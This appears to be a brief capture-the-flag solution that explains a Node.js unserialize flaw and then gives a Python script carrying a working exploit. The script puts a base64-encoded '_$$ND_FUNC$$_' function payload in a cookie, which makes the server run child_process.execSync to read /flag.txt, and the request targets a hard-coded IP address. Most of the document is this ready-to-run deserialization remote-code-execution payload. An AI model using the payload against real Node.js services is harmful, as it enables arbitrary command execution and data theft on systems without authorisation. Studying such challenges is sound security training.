This problem involves exloiting the unserialize vulnerability which 
which executes a function if the serialized version of it contained
the function call

Below is the python file | the username part of the cookie can also
be put in cookie editor extension without the use of this program

(base 64 encoded of serialized of a function )() ---> the () is added
after the serialization otherwise it doesnt get serialized

and then the whole thing is base64 encoded

import requests
import base64

r = requests.post('http://35.226.73.105:7777/joinus', headers = {
    'Cookie': b'guest=' + base64.b64encode(b'''
{"username":{"toString":"_$$ND_FUNC$$_(()=>{throw require('child_process').execSync('cat /flag.txt')})()"}}
'''.strip())
})

x=base64.b64encode(b'''
{"username":{"toString":"_$$ND_FUNC$$_(()=>{throw require('child_process').execSync('cat /flag.txt')})()"}}
'''.strip())

print(r.text)
